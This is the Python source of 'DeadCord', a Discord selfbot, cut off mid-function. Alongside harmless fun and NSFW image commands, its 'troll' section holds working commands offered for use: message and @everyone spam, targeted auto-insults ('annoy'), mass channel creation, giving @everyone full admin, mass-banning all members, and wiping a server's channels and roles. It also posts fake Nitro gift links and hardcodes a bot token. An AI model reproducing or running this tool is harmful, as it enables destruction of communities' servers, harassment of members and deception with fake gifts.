### INFO ###

### IMPORTS ###
import asyncio, ctypes, json, os, random, string, time, requests, re

from colorama import Fore, init
from win32api import *
from win32con import *
from win32file import *
from win32gui import *

### CONFIG ###
global chanid #ignore this
global bottoken #ignore this

chanid = 267624335836053506 # change to your channel ID
bottoken = "OTc1WkMzc0KsMJDskAA" # change to your bot token

init()

try:
    import discord
    from discord import Permissions
    from discord.ext import commands
except Exception:
    print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'Please install requirements')

### VARIABLES AND STUFF ###
### DO NOT TOUCH ANY OF THIS UNLESS YOU KNOW WHAT YOU'RE DOING ###
class Selfbot():
    __version__ = 0.1

class Coms():
    __amount__ = 76

with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')
nitro_sniper = config.get('nitro_sniper')

Deadware = commands.Bot(description='Deadware', command_prefix='d!', bot=True,Intents=None)

Deadcord = discord.Client()
Deadcord = commands.Bot(description='Deadcord Selfbot', command_prefix=prefix, self_bot=True)
Deadcord.remove_command('help')

loop = asyncio.get_event_loop()

def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'

def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

Deadcord.annoy = None
replies = ['Shut up', 'Did not ask', 'Do you ever stop', 'Shh', 'Sup', 'Stop it', 'Stop typing', 'Go away']

### MAIN CODE ###
@Deadcord.event
async def on_ready():
    if nitro_sniper:
        nitro = f'{Fore.GREEN}Active'
    else:
        nitro = f'{Fore.RED}Disabled'
        
    print(f'''{Fore.MAGENTA}                            ██████╗ ███████╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ██████╗ 
                            ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔══██╗
                            ██║  ██║█████╗  ███████║██║  ██║██║     ██║   ██║██████╔╝██║  ██║
                            ██║  ██║██╔══╝  ██╔══██║██║  ██║██║     ██║   ██║██╔══██╗██║  ██║
                            ██████╔╝███████╗██║  ██║██████╔╝╚██████╗╚██████╔╝██║  ██║██████╔╝
                            ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ''')
    print(' ' * 57 + Fore.WHITE + 'SELFBOT')
    print("")
    print(' ' * 44 + f'{Fore.GREEN}[+] {Fore.MAGENTA}Logged in: ' + f'{Fore.WHITE}' + '{0.user}'.format(Deadcord))
    print(' ' * 44 + f'{Fore.GREEN}[+] {Fore.MAGENTA}DeadCord Version: {Fore.WHITE}v{Selfbot.__version__}')
    print(' ' * 44 + f"{Fore.GREEN}[+] {Fore.MAGENTA}Prefix:{Fore.WHITE} {Deadcord.command_prefix}")
    print(' ' * 44 + f'{Fore.GREEN}[+] {Fore.MAGENTA}Commands: {Fore.WHITE}{Coms.__amount__}')
    print(' ' * 44 + f"{Fore.GREEN}[+] {Fore.MAGENTA}Guilds: " + f'{Fore.WHITE}{len(Deadcord.guilds)}')
    await Deadcord.change_presence(activity=discord.Game(name='DeadCord'))
    ctypes.windll.kernel32.SetConsoleTitleW("DeadCord Selfbot")
    print("")

### EVENTS ###
@Deadcord.event
async def on_message(message):
    if Deadcord.annoy is not None and Deadcord.annoy.id == message.author.id:
        await message.channel.send(random.choice(replies) + f' {message.author.name}')
    await Deadcord.process_commands(message)


@Deadcord.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'Command not found')
    elif isinstance(error, commands.MissingRequiredArgument):
        print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'Your missing something')
### HELP COMMAND ###
@Deadcord.command()
async def help(ctx):
    await ctx.message.delete()
    print("")
    print(' ' * 4 + Fore.MAGENTA + 'DEADCORD HELP COMMANDS')
    print("")
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}general', Fore.GREEN + '|', Fore.WHITE + 'general command list')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}nsfw', Fore.GREEN + '   |', Fore.WHITE + 'nsfw command list')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}troll', Fore.GREEN + '  |', Fore.WHITE + 'troll command list')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}admin', Fore.GREEN + '  |', Fore.WHITE + 'admin command list')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}misc', Fore.GREEN + '   |', Fore.WHITE + 'misc command list')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}selfbot', Fore.GREEN + '|', Fore.WHITE + 'selfbot command list')
    print("")

@Deadcord.command()
async def general(ctx):
    await ctx.message.delete()
    print("")
    print(' ' * 4 + Fore.MAGENTA + 'GENERAL COMMANDS')
    print("")
    print (Fore.MAGENTA + f'{Deadcord.command_prefix}slap <user>', Fore.GREEN + '             |', Fore.WHITE + 'slaps a user')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}poke <user>', Fore.GREEN + '             |', Fore.WHITE + 'pokes a user')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}tickle <user>', Fore.GREEN + '           |', Fore.WHITE + 'tickles a user')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}woof', Fore.GREEN + '                    |', Fore.WHITE + 'displays a dog pic')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}meow', Fore.GREEN + '                    |', Fore.WHITE + 'displays a cat pic')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}pat <user>', Fore.GREEN + '              |', Fore.WHITE + 'pats a user')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}tableflip', Fore.GREEN + '               |', Fore.WHITE + 'flips table')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}shrug', Fore.GREEN + '                   |', Fore.WHITE + 'shrugs')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}unflip', Fore.GREEN + '                  |', Fore.WHITE + 'unflips table')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}tts <text>', Fore.GREEN + '              |', Fore.WHITE + 'tts text')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}kanye', Fore.GREEN + '                   |', Fore.WHITE + 'kanye quote')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}fu', Fore.GREEN + '                      |', Fore.WHITE + 'animated fu message')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}noob', Fore.GREEN + '                    |', Fore.WHITE + 'animated noob message')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}lol', Fore.GREEN + '                     |', Fore.WHITE + 'flashing lol message')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}pop', Fore.GREEN + '                     |', Fore.WHITE + 'pop minigame')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}rofl', Fore.GREEN + '                    |', Fore.WHITE + 'rofl gif')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}number', Fore.GREEN + '                  |', Fore.WHITE + 'picks random number')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}coin', Fore.GREEN + '                    |', Fore.WHITE + 'coinflip')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}pick <option1> <option2>', Fore.GREEN + '|', Fore.WHITE + 'picks between option 1 and 2')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}dick <member>', Fore.GREEN + '           |', Fore.WHITE + 'dick size')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}n1c', Fore.GREEN + '                     |', Fore.WHITE + 'no one cares gif')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}arcade', Fore.GREEN + '                  |', Fore.WHITE + 'jackpot machine')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}votekick <member>', Fore.GREEN + '       |', Fore.WHITE + 'starts a votekick')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}DEADCORD', Fore.GREEN + '                |', Fore.WHITE + 'Displays DEADCORD ASCII')

@Deadcord.command()
async def nsfw(ctx):
    await ctx.message.delete()
    print("")
    print(' ' * 10 + 'NSFW COMMANDS')
    print("")
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}nekos_pussygif', Fore.GREEN + ' |', Fore.WHITE + 'nekos pussygif')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}nekos_cum', Fore.GREEN + '      |', Fore.WHITE + 'nekos cum pic')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}nekos_tits', Fore.GREEN + '     |', Fore.WHITE + 'nekos tits pic')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}nekos_feet', Fore.GREEN + '     |', Fore.WHITE + 'nekos feet pic')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}nekos_bj', Fore.GREEN + '       |', Fore.WHITE + 'nekos blowjob pic')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}nekos_lewd', Fore.GREEN + '     |', Fore.WHITE + 'nekos lewd pic')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}nekos_trap', Fore.GREEN + '     |', Fore.WHITE + 'nekos trap pic')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}nekos_wallpaper', Fore.GREEN + '|', Fore.WHITE + 'nekos wallpaper')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}ass', Fore.GREEN + '            |', Fore.WHITE + 'ass pic')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}pussy', Fore.GREEN + '          |', Fore.WHITE + 'pussy pic')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}thigh', Fore.GREEN + '          |', Fore.WHITE + 'thigh pic')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}pgif', Fore.GREEN + '           |', Fore.WHITE + 'porn gif')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}anal', Fore.GREEN + '           |', Fore.WHITE + 'anal pic')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}fourk', Fore.GREEN + '          |', Fore.WHITE + '4k pic')

@Deadcord.command()
async def troll(ctx):
    await ctx.message.delete()
    print("")
    print(' ' * 19 + Fore.MAGENTA + 'TROLL COMMANDS')
    print("")
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}deadcord_spam <message> <duration>', Fore.GREEN + '|', Fore.WHITE + 'spams message')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}everyone <duration>', Fore.GREEN + '               |', Fore.WHITE + 'spams @everyone')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}blank_spam <duration>', Fore.GREEN + '             |', Fore.WHITE + 'spams blank message')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}annoy <member>', Fore.GREEN + '                    |', Fore.WHITE + 'starts annoying member')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}stop_annoy', Fore.GREEN + '                        |', Fore.WHITE + 'stops annoying member')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}channel_spam', Fore.GREEN + '                      |', Fore.WHITE + 'channel spam')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}everyone_admin', Fore.GREEN + '                    |', Fore.WHITE + 'tries to give everyone admin')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}mass_ban', Fore.GREEN + '                          |', Fore.WHITE + 'tries to mass ban everyone')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}nitro', Fore.GREEN + '                             |', Fore.WHITE + 'fake nitro')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}deadcord_wipe', Fore.GREEN + '                     |', Fore.WHITE + 'server wipe')

@Deadcord.command()
async def admin(ctx):
    await ctx.message.delete()
    print("")
    print(' ' * 10 + Fore.MAGENTA + 'ADMIN COMMANDS')
    print("")
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}copy_guild', Fore.GREEN + '    |', Fore.WHITE + 'copies a guild')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}pfp <member>', Fore.GREEN + '  |', Fore.WHITE + 'displays members profile pic')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}addRole <name>', Fore.GREEN + '|', Fore.WHITE + 'creates role')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}rmRole <name>', Fore.GREEN + ' |', Fore.WHITE + 'deletes a role')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}kick <member>', Fore.GREEN + ' |', Fore.WHITE + 'kicks member')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}ban <member>', Fore.GREEN + '  |', Fore.WHITE + 'bans a member')

@Deadcord.command()
async def misc(ctx):
    await ctx.message.delete()                  #RMEOVE EMB
    print("")
    print(' ' * 10 + Fore.MAGENTA + 'MISC COMMANDS')
    print("")
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}pass_gen <length>', Fore.GREEN + '  |', Fore.WHITE + 'password generator')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}spoiler <message>', Fore.GREEN + '  |', Fore.WHITE + 'spoiler message')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}bold <message>', Fore.GREEN + '     |', Fore.WHITE + 'bold message')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}itl <message>', Fore.GREEN + '      |', Fore.WHITE + 'italic message')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}underline <message>', Fore.GREEN + '|', Fore.WHITE + 'underlined message')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}geoip <ip>', Fore.GREEN + '         |', Fore.WHITE + 'geolocation of IP')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}encrypt', Fore.GREEN + '            |', Fore.WHITE + 'sends encrypted message')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}decrypt <message>', Fore.GREEN + '  |', Fore.WHITE + 'shows decrypted message')

@Deadcord.command()
async def selfbot(ctx):
    await ctx.message.delete()
    print("")
    print(' ' * 14 + Fore.MAGENTA + 'SELFBOT COMMANDS')
    print("")
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}shutdown', Fore.GREEN + '            |', Fore.WHITE + 'shutdown selfbot')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}change_prefix <prefix>', Fore.GREEN + '     |', Fore.WHITE + 'changes selfbot prefix')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}playing <game>', Fore.GREEN + '      |', Fore.WHITE + 'playing status')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}streaming <name>', Fore.GREEN + '    |', Fore.WHITE + 'streaming status')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}listening <name>', Fore.GREEN + '    |', Fore.WHITE + 'listening status')
    print(Fore.RED + f'{Deadcord.command_prefix}[DISABLED] bug <explain>', Fore.GREEN + '       |', Fore.RED + 'sends bug to devs')
    print(Fore.RED + f'{Deadcord.command_prefix}[DISABLED] suggestion <content>', Fore.GREEN + '|', Fore.RED + 'sends suggestion to the devs')
    print(Fore.MAGENTA + f'{Deadcord.command_prefix}check <token>', Fore.GREEN + '|', Fore.WHITE + 'return state of a token and its details')

### GENERAL COMMANDS ###
@Deadcord.command()
async def slap(ctx, member : discord.Member):
    mem = member.mention
    await ctx.message.delete()
    r = requests.get('https://www.nekos.life/api/v2/img/slap') 
    res = r.json()
    await ctx.send(mem)
    await ctx.send(res["url"])

@Deadcord.command()
async def poke(ctx, member : discord.Member):
    mem = member.mention
    await ctx.message.delete()
    r = requests.get('https://www.nekos.life/api/v2/img/poke') 
    res = r.json()
    await ctx.send(mem)
    await ctx.send(res["url"])

@Deadcord.command()
async def tickle(ctx, member : discord.Member):
    mem = member.mention
    await ctx.message.delete()
    r = requests.get('https://www.nekos.life/api/v2/img/tickle') 
    res = r.json()
    await ctx.send(mem)
    await ctx.send(res["url"])

@Deadcord.command()
async def woof(ctx):
    await ctx.message.delete()
    r = requests.get('https://www.nekos.life/api/v2/img/woof') 
    res = r.json()
    await ctx.send(res["url"])

@Deadcord.command()
async def meow(ctx):
    await ctx.message.delete()
    r = requests.get('https://www.nekos.life/api/v2/img/meow') 
    res = r.json()
    await ctx.send(res["url"])

@Deadcord.command()
async def pat(ctx, member : discord.Member):
    mem = member.mention
    await ctx.message.delete()
    r = requests.get('https://www.nekos.life/api/v2/img/pat') 
    res = r.json()
    await ctx.send(mem)
    await ctx.send(res["url"])

@Deadcord.command()
async def tableflip(ctx):
    await ctx.message.delete()
    await ctx.send('(╯°□°）╯︵ ┻━┻')

@Deadcord.command()
async def shrug(ctx):
    m = r'¯\_(ツ)_/¯'
    await ctx.message.delete()
    await ctx.send(m)

@Deadcord.command()
async def unflip(ctx):
    await ctx.message.delete()
    await ctx.send('┬─┬ ノ( ゜-゜ノ)')

@Deadcord.command()
async def tts(ctx, *, msg):
    m = msg
    await ctx.message.delete()
    await ctx.send(m, tts=True)

@Deadcord.command()
async def kanye(ctx):
    await ctx.message.delete()
    r = requests.get('https://api.kanye.rest/')
    res = r.json()
    await ctx.send('**' + res["quote"] + '**' + ' -kanye')

@Deadcord.command()
async def fu(ctx):
    await ctx.message.delete()
    message = await ctx.send(f"Fuck You")
    await message.edit(content="uck You")
    await message.edit(content="ck You")
    await message.edit(content="k You")
    await message.edit(content="You")
    await message.edit(content="ou")
    await message.edit(content="u")
    await message.edit(content="Fuck You")

@Deadcord.command()
async def noob(ctx):
    await ctx.message.delete()
    message = await ctx.send("Noob")
    await message.edit(content="nOob")
    await message.edit(content="noOb")
    await message.edit(content="nooB")
    await message.edit(content="Noob")
    await message.edit(content="nOob")
    await message.edit(content="noOb")
    await message.edit(content="nooB")
    await message.edit(content="Noob")

@Deadcord.command()
async def lol(ctx):
    await ctx.message.delete()
    message = await ctx.send(content="LOL")
    await message.edit(content="** **")
    await message.edit(content="LOL")
    await message.edit(content="** **")
    await message.edit(content="LOL")
    await message.edit(content="** **")
    await message.edit(content="LOL")

@Deadcord.command()
async def pop(ctx):
    await ctx.message.delete()
    await ctx.send('||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||\n||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||\n||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||\n||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||\n||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||||pop||')

@Deadcord.command()
async def number(ctx):
    await ctx.message.delete()
    n = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
    await ctx.send(random.choice(n))

@Deadcord.command()
async def coin(ctx):
    await ctx.message.delete()
    n = ['heads', 'tails']
    await ctx.send(random.choice(n))

@Deadcord.command()
async def pick(ctx, member, *, mem):
    await ctx.message.delete()
    n = [f'{member}', f'{mem}']
    await ctx.send(random.choice(n))

@Deadcord.command()
async def dick(ctx, *, member : discord.Member):
    await ctx.message.delete()
    m = member.mention
    c = ['8=D', '8==D', '8===D', '8====D', '8=====D']
    await ctx.send(f'{m} dick size is ' + random.choice(c))

@Deadcord.command()
async def arcade(ctx):
    await ctx.message.delete()
    c = ['You Lost\n1 2 3', 'You Lost\n1 1 2', 'You Lost\n2 1 1', 'You Lost\n2 3 1', 'WINNER\n1 1 1']
    await ctx.send(random.choice(c)) 

@Deadcord.command()
async def rofl(ctx):
    await ctx.message.delete()
    await ctx.send("https://tenor.com/view/laughing-hysterically-laugh-crying-gif-13968444")

@Deadcord.command()
async def n1c(ctx):
    await ctx.message.delete()
    await ctx.send("https://tenor.com/view/nobody-cares-nobody-cares-spongebob-imagination-gif-8176136")

@Deadcord.command()
async def votekick(ctx, member : discord.Member, reason = None):
    await ctx.message.delete()
    author = ctx.message.author
    emojis = ['👍', '👎']
    message = await ctx.send(f'**__VoteKick?__**\n{author.mention} Started a vote kick for **{member.mention}**')
    for emoji in emojis:
        await message.add_reaction(emoji)

@Deadcord.command()
async def DEADCORD(ctx):
    await ctx.message.delete()
    await ctx.send("""```██████╗ ███████╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ██████╗ 
██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔══██╗
██║  ██║█████╗  ███████║██║  ██║██║     ██║   ██║██████╔╝██║  ██║
██║  ██║██╔══╝  ██╔══██║██║  ██║██║     ██║   ██║██╔══██╗██║  ██║
██████╔╝███████╗██║  ██║██████╔╝╚██████╗╚██████╔╝██║  ██║██████╔╝
╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝

> Trusted, powerful, purposeful. 
Invite: https://discord.gg/DsbrkKmMmC```""")

### NSFW COMMANDS ###
@Deadcord.command()
async def nekos_pussygif(ctx):
    await ctx.message.delete()
    r = requests.get('https://www.nekos.life/api/v2/img/pussy') 
    res = r.json()
    await ctx.send(res["url"])

@Deadcord.command()
async def nekos_cum(ctx):
    await ctx.message.delete()
    r = requests.get('https://www.nekos.life/api/v2/img/cum') 
    res = r.json()
    await ctx.send(res["url"])

@Deadcord.command()
async def nekos_tits(ctx):
    await ctx.message.delete()
    r = requests.get('https://www.nekos.life/api/v2/img/tits') 
    res = r.json()
    await ctx.send(res["url"])

@Deadcord.command()
async def nekos_feet(ctx):
    await ctx.message.delete()
    r = requests.get('https://www.nekos.life/api/v2/img/feet') 
    res = r.json()
    await ctx.send(res["url"])

@Deadcord.command()
async def nekos_bj(ctx):
    await ctx.message.delete()
    r = requests.get('https://www.nekos.life/api/v2/img/blowjob') 
    res = r.json()
    await ctx.send(res["url"])

@Deadcord.command()
async def nekos_lewd(ctx):
    await ctx.message.delete()
    r = requests.get("https://www.nekos.life/api/v2/img/lewd")
    res = r.json()
    await ctx.send(res["url"])

@Deadcord.command()
async def nekos_trap(ctx):
    await ctx.message.delete()
    r = requests.get("https://www.nekos.life/api/v2/img/trap")
    res = r.json()
    await ctx.send(res["url"])

@Deadcord.command()
async def nekos_wallpaper(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/wallpaper")
    res = r.json()
    await ctx.send(res["url"])

@Deadcord.command()
async def ass(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekobot.xyz/api/image?type=ass")
    res = r.json()
    await ctx.send(res["message"])

@Deadcord.command()
async def pussy(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekobot.xyz/api/image?type=pussy")
    res = r.json()
    await ctx.send(res["message"])

@Deadcord.command()
async def thigh(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekobot.xyz/api/image?type=thigh")
    res = r.json()
    await ctx.send(res["message"])

@Deadcord.command()
async def pgif(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekobot.xyz/api/image?type=pgif")
    res = r.json()
    await ctx.send(res["message"])

@Deadcord.command()
async def anal(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekobot.xyz/api/image?type=anal")
    res = r.json()
    await ctx.send(res["message"])

@Deadcord.command()
async def fourk(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekobot.xyz/api/image?type=4k")
    res = r.json()
    await ctx.send(res["message"])

### TROLL COMMANDS ###
@Deadcord.command()
async def deadcord_spam(ctx, msg : str = None, *, dur : int = None):
    if msg is None:
        print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'Please give a message to spam')
    elif dur is None:
        print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'No duration given')
    else:
        await ctx.message.delete()
        amt = int(dur)
        n=0                                     
        while(n<=amt):
            await ctx.send(f'{msg}')
            n = n+1
        print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'Stopped DeadCord_spam')

@Deadcord.command()
async def everyone(ctx, *, dur : int = None):
    if dur is None:
        print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'No duration given')
    else:
        await ctx.message.delete()
        amt = int(dur)
        n=0                                 
        while(n<=amt):
            await ctx.send("@everyone")
            n = n+1
        print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'Stopped spamming everyone')

@Deadcord.command()
async def blank_spam(ctx, *, dur : int = None):
    if dur is None:
        print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'No duration given')
    else:
        await ctx.message.delete()
        amt = int(dur)
        n=0
        while(n<=amt):                  
            await ctx.send("** **")
            n = n+1
        print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'Stopped blank_spam')

@Deadcord.command()
async def annoy(ctx, *, user : discord.Member):
    await ctx.message.delete()
    Deadcord.annoy = user
    print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + f'Now annoying {user}')

@Deadcord.command()
async def stop_annoy(ctx):
    await ctx.message.delete()
    if Deadcord.annoy is None:
        print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'You was not annoying anyone')
        return
    else:
        print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + f'Stopped annoying ' + str(Deadcord.annoy))
        Deadcord.annoy = None

@Deadcord.command()
async def channel_spam(ctx):
    await ctx.message.delete()
    for i in range(250):
        try:
            await ctx.guild.create_text_channel(name='DeadCord')
        except:
            return

@Deadcord.command()
async def everyone_admin(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get(guild.roles, name = "@everyone")
        await role.edit(permissions = Permissions.all())
        print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'I have given everyone admin')
    except:
        print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'Could not give everyone admin')

@Deadcord.command()
async def mass_ban(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    for member in guild.members:
        try:
            await member.ban()
            print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + f'Banning {member.name}')
        except:
            print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + f'Could not ban {member.name}')

@Deadcord.command()
async def nitro(ctx):
    await ctx.message.delete()
    await ctx.send(Nitro())

@Deadcord.command()
async def deadcord_wipe(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get(guild.roles, name = '@everyone')
        await role.edit(permissions = Permissions.all())
        print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'I have given everyone admin')
    except:
        print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'I could not give everyone admin')

    await ctx.guild.edit(name='DeadCord')

    for c in ctx.guild.channels:
        await c.delete()

    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + f'Deleted {role}')
        except:
            print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + f'Could not delete {role}')

### ADMIN COMMANDS ###
@Deadcord.command()
async def copy_guild(ctx):
    await ctx.message.delete()
    await Deadcord.create_guild(f'{ctx.guild.name}-template')
    await asyncio.sleep(5)
    for server in Deadcord.guilds:
        if f'{ctx.guild.name}-template' in server.name:             
            for c in server.channels:
                await c.delete()
    for cat in ctx.guild.categories:
        x = await server.create_category(f"{cat.name}")
    for chan in cat.channels:
        if isinstance(chan, discord.VoiceChannel):
            await x.create_voice_channel(f"{chan}")
        if isinstance(chan, discord.TextChannel):
            await x.create_text_channel(f"{chan}")
    try:
        await server.edit(icon=ctx.guild.icon_url)
    except:
        pass

@Deadcord.command()
async def pfp(ctx, member : discord.Member):
    av = member.avatar_url
    await ctx.send(f'||{av}||')

@Deadcord.command()
async def addRole(ctx, nm):
    await ctx.message.delete()
    guild = ctx.guild
    await guild.create_role(name=nm)
    print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + f'{nm} created')

@Deadcord.command()
async def rmRole(ctx, nm: discord.Role):
    await ctx.message.delete()
    await nm.delete()
    print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + f'{nm} deleted')

@Deadcord.command()
async def kick(ctx, member : discord.Member, *, reason=None):
    await member.kick(reason=reason)

@Deadcord.command()
async def ban(ctx, member : discord.Member, *, reason=None):
    await member.ban(reason=reason)

### MISC COMMANDS ###
@Deadcord.command()
async def pass_gen(ctx, *, length : int = None):
    if length is None:
        print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'You did not speficy a password length')
    else:
        await ctx.message.delete()
        char_set = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789<,>.?/:;@£$%^&*()_-+='
        res = int(length)                                                                                       
        result = ''.join(random.choice(char_set) for i in range(res))
        print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + f'Your Password: {result}')

@Deadcord.command()
async def spoiler(ctx, *, msg):
    await ctx.message.delete()
    await ctx.send('||' + msg + '||')

@Deadcord.command()
async def bold(ctx, *, msg):
    await ctx.message.delete()
    await ctx.send('**' + msg + '**')

@Deadcord.command()
async def itl(ctx, *, msg):
    await ctx.message.delete()
    await ctx.send('*' + msg + '*')

@Deadcord.command()
async def underline(ctx, *, msg):
    await ctx.message.delete()
    await ctx.send('__' + msg + '__')

@Deadcord.command()
async def geoip(ctx, *, ip):
    await ctx.message.delete()
    r = requests.get("https://api.hackertarget.com/geoip/?q=" + ip)
    res = r.text
    await ctx.send('```' + res + '```')

@Deadcord.command()
async def encrypt(ctx):
    await ctx.message.delete()
    X_decrypted = b"abcdefghijklmnopqrstuvwxyz0123456789?.-, /:ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    X_encrypted = b"bnmvcxolkjhdfgsaeziuytrpwq%938165427.>@:/+{BNMVCXOLKJHDFGSAEZIUYTRPWQ"

    encrypt_table = bytes.maketrans(X_decrypted, X_encrypted)
    decrypt_table = bytes.maketrans(X_encrypted, X_decrypted)

    msg = input("Message> ")

    result = msg.translate(encrypt_table)
    await ctx.send(result)
    print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'Message sent!')

@Deadcord.command()
async def decrypt(ctx, *, msg : str = None):
    if msg is None:
        print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + "No message specified!")
